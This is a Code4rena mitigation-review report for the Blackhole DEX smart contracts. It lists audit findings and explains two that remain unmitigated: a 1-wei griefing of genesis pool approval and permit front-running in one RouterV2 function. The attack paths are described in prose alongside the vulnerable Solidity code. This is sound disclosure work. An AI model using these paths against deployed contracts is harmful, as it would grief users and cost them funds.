<h1 style="position:relative;" id="mitigation-review"><a class="anchor before" aria-label="mitigation review permalink" href="#mitigation-review"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="#mitigation-review">Mitigation Review</a></h1>
<h2 style="position:relative;" id="introduction"><a class="anchor before" aria-label="introduction permalink" href="#introduction"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Introduction</h2>
<p>Following the C4 audit, 3 wardens (<a href="https://code4rena.com/@rayss">rayss</a>, <a href="https://code4rena.com/@lonelybones">lonelybones</a> and <a href="https://code4rena.com/@maxzuvex">maxzuvex</a>) reviewed the mitigations for all identified issues. Additional details can be found within the <a href="https://github.com/code-423n4/2025-06-blackhole-mitigation">C4 Blackhole Mitigation Review repository</a>.</p>
<h2 style="position:relative;" id="mitigation-review-scope--summary"><a class="anchor before" aria-label="mitigation review scope  summary permalink" href="#mitigation-review-scope--summary"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Mitigation Review Scope &amp; Summary</h2>
<p>During the mitigation review, the wardens determined that 2 in-scope findings from the original audit were not fully mitigated. The table below provides details regarding the status of each in-scope vulnerability from the original audit, followed by full details on the in-scope vulnerabilities that were not fully mitigated.</p>
<table>
<thead>
<tr>
<th align="center">Original Issue</th>
<th>Status</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-245">H-01</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-176">H-02</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-17">M-01</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-184">M-02</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-175">M-03</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-114">M-04</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-122">M-05</a></td>
<td>🔴 Unmitigated</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-187">M-06</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-279">M-07</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-324">M-08</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-409">M-09</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-410">M-10</a></td>
<td>🔴 Unmitigated</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-74">M-11</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-236">M-14</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-33">M-15</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-406">M-16</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-412">M-17</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-416">M-18</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-419">M-19</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-423">M-20</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-82">M-21</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-220">ADD-01</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-83">ADD-02</a></td>
<td>🟢 Mitigation Confirmed</td>
</tr>
</tbody>
</table>
<hr>
<h2 style="position:relative;" id="m-05-unmitigated"><a class="anchor before" aria-label="m 05 unmitigated permalink" href="#m-05-unmitigated"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-40">[M-05] Unmitigated</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-40">rayss</a>, also found by <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-17">lonelybones</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-57">maxvzuvex</a>.</em></p>
<p><a href="https://github.com/BlackHoleDEX/SmartContracts/blob/7b5c04a9b91a4f11063f4d403b97f5ec97a21600/contracts/GenesisPoolManager.sol#L174">https://github.com/BlackHoleDEX/SmartContracts/blob/7b5c04a9b91a4f11063f4d403b97f5ec97a21600/contracts/GenesisPoolManager.sol#L174</a></p>
<h3 style="position:relative;" id="finding-description-24"><a class="anchor before" aria-label="finding description 24 permalink" href="#finding-description-24"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The S-122 issue’s duplicate S-348 highlights that in the GenesisPool approval process an insecure balance check used during <code>approveGenesisPool</code>. After a whitelisted user calls <code>depositNativeToken</code> to initialize a GenesisPool, anyone observing this data can preemptively create the same pair via PairFactory and send a minimal amount (even 1 wei) of the fund<code>ingToken directly to the pair contract. When governance later attempts to approve the pool, the function checks that both the</code>nativeToken<code>and</code>fundingToken<code>balances at the pair address are zero. If either balance is non-zero—due to direct token transfers—the approval fails with a</code>!ZV` revert. This allows malicious actors to grief or brick the approval process at negligible cost.</p>
<p>The new mitigation in the <code>depositNativeToken</code> and <code>approveGenesisPool</code>:</p>
<p>In the <code>depositNativeToken</code>:</p>
<pre data-index="94" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">            if (pairAddress == address(0)) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            pairAddress = pairFactory.createPair(nativeToken, _fundingToken, _stable);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        } else {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            require(IERC20(nativeToken).balanceOf(pairAddress) == 0, "!ZV");</span></span>
<span class="grvsc-line"><span class="grvsc-source">            require(IERC20(_fundingToken).balanceOf(pairAddress) == 0, "!ZV");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        pairFactory.setGenesisStatus(pairAddress, true);</span></span></code></pre>
<p>In the <code>approveGenesisPool</code>:</p>
<pre data-index="95" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    require(IERC20(nativeToken).balanceOf(pairAddress) == 0, "!ZV");Add commentMore actions</span></span>
<span class="grvsc-line"><span class="grvsc-source">        require(IERC20(genesisInfo.fundingToken).balanceOf(pairAddress) == 0, "!ZV");</span></span></code></pre>
<p>The issue remains unmitigated even for this (but in a different attack path than the review I stated for S-122). Let’s understand this via a example:</p>
<p>User calls the <code>depositNativeToken</code>. The pair address is not created so it enters the if block and calls <code>createPair()</code> function.</p>
<p>Now after this step, the attacker views the transactions in the mempool via a coreth node and sees that a pair has been created, he quickly sends 1 wei to the <code>pairAddress</code> before the <code>approveGenesisPool()</code> function is called.</p>
<p>Now when the <code>approveGenesisPool()</code> is called it has this check:</p>
<pre data-index="96" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">  require(IERC20(nativeToken).balanceOf(pairAddress) == 0, "!ZV");Add commentMore actions</span></span>
<span class="grvsc-line"><span class="grvsc-source">        require(IERC20(genesisInfo.fundingToken).balanceOf(pairAddress) == 0, "!ZV");</span></span></code></pre>
<p>Which will revert. Leading to the Dos of the <code>approveGenesisPool</code>. Hence, leading to the issue to be remained unmitigated.</p>
<hr>
<h2 style="position:relative;" id="m-10-unmitigated"><a class="anchor before" aria-label="m 10 unmitigated permalink" href="#m-10-unmitigated"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-34">[M-10] Unmitigated</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-34">rayss</a>, also found by <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-11">lonelybones</a>.</em></p>
<p><a href="https://github.com/BlackHoleDEX/SmartContracts/blob/7b5c04a9b91a4f11063f4d403b97f5ec97a21600/contracts/RouterV2.sol#L726">https://github.com/BlackHoleDEX/SmartContracts/blob/7b5c04a9b91a4f11063f4d403b97f5ec97a21600/contracts/RouterV2.sol#L726</a></p>
<h3 style="position:relative;" id="finding-description-25"><a class="anchor before" aria-label="finding description 25 permalink" href="#finding-description-25"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>This issue demonstrates that in the <code>removeLiquidityWithPermit()</code> and <code>removeLiquidityETHWithPermit()</code> functions in RouterV2, which unconditionally call <code>permit()</code> without proper error handling. This allows an attacker to front-run the permit signature (extracted from the <code>mempool</code>), causing the original transaction to revert and resulting in gas fee loss for the user.</p>
<p>The new mitigation correctly uses the try and catch method to rectify the issue in the <code>removeLiquidityWithPermit()</code> and <code>removeLiquidityETHWithPermit()</code> functions.</p>
<p>However, this issue still remains unmitigated because the <code>removeLiquidityETHWithPermitSupportingFeeOnTransferTokens()</code> function is not guarded with this logic. It continues to make a direct, unprotected call to <code>permit()</code>. As a result, the issue remains unmitigated, since the vulnerability is still exploitable via the <code>removeLiquidityETHWithPermitSupportingFeeOnTransferTokens()</code> function, allowing attackers to front-run and invalidate user transactions.</p>
<pre data-index="97" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(</span></span>
<span class="grvsc-line"><span class="grvsc-source">        address token,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        bool stable,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint liquidity,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint amountTokenMin,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint amountETHMin,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        address to,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint deadline,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        bool approveMax, uint8 v, bytes32 r, bytes32 s</span></span>
<span class="grvsc-line"><span class="grvsc-source">    ) external returns (uint amountToken, uint amountETH) { </span></span>
<span class="grvsc-line"><span class="grvsc-source">        address pair = pairFor(token, address(wETH), stable);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint value = approveMax ? type(uint).max : liquidity;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        IBaseV1Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        (amountToken, amountETH) = removeLiquidityETHSupportingFeeOnTransferTokens(</span></span>
<span class="grvsc-line"><span class="grvsc-source">            token, stable, liquidity, amountTokenMin, amountETHMin, to, deadline</span></span>
<span class="grvsc-line"><span class="grvsc-source">        );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span></code></pre>
<hr>
<h1 style="position:relative;" id="disclosures"><a class="anchor before" aria-label="disclosures permalink" href="#disclosures"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Disclosures</h1>
<p>C4 is an open organization governed by participants in the community.</p>
<p>C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>
<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>
<style class="grvsc-styles">
  .grvsc-container {
    overflow: auto;
    position: relative;
    -webkit-overflow-scrolling: touch;
    padding-top: 1rem;
    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));
    padding-bottom: 1rem;
    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));
    border-radius: 8px;
    border-radius: var(--grvsc-border-radius, 8px);
    font-feature-settings: normal;
    line-height: 1.4;
  }
  
  .grvsc-code {
    display: table;
  }
  
  .grvsc-line {
    display: table-row;
    box-sizing: border-box;
    width: 100%;
    position: relative;
  }
  
  .grvsc-line > * {
    position: relative;
  }
  
  .grvsc-gutter-pad {
    display: table-cell;
    padding-left: 0.75rem;
    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);
  }
  
  .grvsc-gutter {
    display: table-cell;
    -webkit-user-select: none;
    -moz-user-select: none;
    user-select: none;
  }
  
  .grvsc-gutter::before {
    content: attr(data-content);
  }
  
  .grvsc-source {
    display: table-cell;
    padding-left: 1.5rem;
    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));
    padding-right: 1.5rem;
    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));
  }
  
  .grvsc-source:empty::after {
    content: ' ';
    -webkit-user-select: none;
    -moz-user-select: none;
    user-select: none;
  }
  
  .grvsc-gutter + .grvsc-source {
    padding-left: 0.75rem;
    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);
  }
  
  /* Line transformer styles */
  
  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {
    content: ' ';
    position: absolute;
    width: 100%;
  }
  
  .grvsc-line-diff-add::before {
    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));
  }
  
  .grvsc-line-diff-del::before {
    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));
  }
  
  .grvsc-line-number {
    padding: 0 2px;
    text-align: right;
    opacity: 0.7;
  }
  
  .dark-default-dark {
    background-color: #1E1E1E;
    color: #D4D4D4;
  }
  .dark-default-dark .mtk4 { color: #569CD6; }
  .dark-default-dark .mtk1 { color: #D4D4D4; }
  .dark-default-dark .mtk11 { color: #DCDCAA; }
  .dark-default-dark .mtk12 { color: #9CDCFE; }
  .dark-default-dark .mtk7 { color: #B5CEA8; }
  .dark-default-dark .mtk8 { color: #CE9178; }
  .dark-default-dark .mtk3 { color: #6A9955; }
  .dark-default-dark .mtk15 { color: #C586C0; }
  .dark-default-dark .mtk10 { color: #4EC9B0; }
  .dark-default-dark .mtk6 { color: #D7BA7D; }
  .dark-default-dark .grvsc-line-highlighted::before {
    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));
    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));
  }
</style></div></div></div></div><button class="button floating-button" type="button">Top</button></div></main><footer class="footer limited-width"><ul class="footer__items"><li class="footer__item"><a href="https://twitter.com/code4rena" target="_blank" rel="noreferrer" aria-label="Twitter (Opens in new Window)">Twitter</a></li><li class="footer__item"><a href="https://discord.gg/code4rena" target="_blank" rel="noreferrer" aria-label="Discord (Opens in new Window)">Discord</a></li><li class="footer__item"><a href="https://github.com/code-423n4/" target="_blank" rel="noreferrer" aria-label="GitHub (Opens in new Window)">GitHub</a></li><li class="footer__item"><a href="https://github.com/code-423n4/media-kit" target="_blank" rel="noreferrer" aria-label="Media Kit (Opens in new Window)">Media kit</a></li></ul></footer></div><script src="/_next/static/chunks/webpack-ee83ff9cf0b0c89c.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/media/9b7eb431f23ca42e-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n2:HL[\"/_next/static/media/b603571150b520e0-s.p.ttf\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/ttf\"}]\n3:HL[\"/_next/static/media/d9396795aa5ec363-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n4:HL[\"/_next/static/css/aa1e03632b0a9f00.css\",\"style\"]\n5:HL[\"/_next/static/css/9942e0cbde34320f.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"6:I[12846,[],\"\"]\n9:I[4707,[],\"\"]\nb:I[36423,[],\"\"]\nc:I[15718,[\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"3211\",\"static/chunks/app/reports/error-337d8165658cb655.js\"],\"default\"]\nf:I[61060,[],\"\"]\na:[\"slug\",\"2025-05-blackhole\",\"d\"]\n10:[]\n0:[\"$\",\"$L6\",null,{\"buildId\":\"BzWW4sxhuBIKztMBPk3l4\",\"assetPrefix\":\"\",\"urlParts\":[\"\",\"reports\",\"2025-05-blackhole\"],\"initialTree\":[\"\",{\"children\":[\"reports\",{\"children\":[[\"slug\",\"2025-05-blackhole\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],\"initialSeedData\":[\"\",{\"children\":[\"reports\",{\"children\":[[\"slug\",\"2025-05-blackhole\",\"d\"],{\"children\":[\"__PAGE__\",{},[[\"$L7\",\"$L8\",null],null],null]},[null,[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"reports\",\"children\",\"$a\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\"}]],null]},[null,[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"reports\",\"children\"],\"error\":\"$c\",\"errorStyles\":[],\"errorScripts\":[],\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\"}]],null]},[[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/aa1e03632b0a9f00.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/9942e0cbde34320f.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}]],\"$Ld\"],null],null],\"couldBeIntercepted\":false,\"initialHead\":[null,\"$Le\"],\"globalErrorComponent\":\"$f\",\"missingSlots\":\"$W10\"}]\n"])</script><script>self.__next_f.push([1,"11:I[36525,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"6686\",\"static/chunks/6686-dd6382cfde9e8708.js\",\"5813\",\"static/chunks/5813-7499623caf5cc29b.js\",\"1638\",\"static/chunks/1638-02441f876b022d5b.js\",\"191\",\"static/chunks/191-db678ccd3d1e6084.js\",\"867\",\"static/chunks/867-ac7b2edcc9aa90cf.js\",\"7834\",\"static/chunks/7834-0fb33076adf039e3.js\",\"3185\",\"static/chunks/app/layout-bd3ec2013b0d95b1.js\"],\"default\"]\n12:I[75292,[\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"9160\",\"static/chunks/app/not-found-c0beac80bd3674ca.js\"],\"default\"]\n13:I[80319,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"1638\",\"static/chunks/1638-02441f876b022d5b.js\",\"191\",\"static/chunks/191-db678ccd3d1e6084.js\",\"867\",\"static/chunks/867-ac7b2edcc9aa90cf.js\",\"7834\",\"static/chunks/7834-0fb33076adf039e3.js\",\"1960\",\"static/chunks/app/reports/%5Bslug%5D/page-7e2f67b2ed9d0f65.js\"],\"default\"]\n14:I[39350,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chu"])</script><script>self.__next_f.push([1,"nks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"1638\",\"static/chunks/1638-02441f876b022d5b.js\",\"191\",\"static/chunks/191-db678ccd3d1e6084.js\",\"867\",\"static/chunks/867-ac7b2edcc9aa90cf.js\",\"7834\",\"static/chunks/7834-0fb33076adf039e3.js\",\"1960\",\"static/chunks/app/reports/%5Bslug%5D/page-7e2f67b2ed9d0f65.js\"],\"default\"]\n17:I[75899,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"1638\",\"static/chunks/1638-02441f876b022d5b.js\",\"191\",\"static/chunks/191-db678ccd3d1e6084.js\",\"867\",\"static/chunks/867-ac7b2edcc9aa90cf.js\",\"7834\",\"static/chunks/7834-0fb33076adf039e3.js\",\"1960\",\"static/chunks/app/reports/%5Bslug%5D/page-7e2f67b2ed9d0f65.js\"],\"default\"]\nd:[\"$\",\"html\",null,{\"lang\":\"en\",\"className\":\"dark __variable_145019 __variable_7d3254 